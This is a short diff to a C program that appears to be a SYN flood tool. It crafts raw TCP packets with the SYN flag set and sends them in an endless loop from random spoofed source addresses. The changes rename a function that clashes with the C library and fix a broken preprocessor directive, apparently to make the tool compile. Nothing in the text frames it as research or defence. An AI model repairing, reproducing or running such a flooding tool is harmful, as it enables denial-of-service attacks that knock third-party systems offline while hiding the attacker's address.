@@ -10,7 +10,7 @@
 #include <netinet/ip.h>
 #include <arpa/inet.h>
 #include <netinet/tcp.h>
-void access(int sock,struct sockaddr_in *target,unsigned short srcport);
+void Access(int sock,struct sockaddr_in *target,unsigned short srcport);
 unsigned short check_sum(unsigned short *addr,int len);
 
 int main(int argc,char** argv)
@@ -57,10 +57,10 @@ int main(int argc,char** argv)
 
    setuid(getpid());
    srcport = atoi(argv[3]);
-   access(sock,&target,srcport);
+   Access(sock,&target,srcport);
 }
 
-void access(int sock,struct sockaddr_in *target,unsigned short srcport){
+void Access(int sock,struct sockaddr_in *target,unsigned short srcport){
    char buf[128]={0};
    struct ip *ip;
    struct tcphdr *tcp;
@@ -95,7 +95,7 @@ void access(int sock,struct sockaddr_in *target,unsigned short srcport){
    tcp->th_off = 5;
    tcp->th_flags =0x02;
    tcp->th_sum = 0;
-#elif
+#endif
 
    while(1){
            ip->ip_src.s_addr = random();
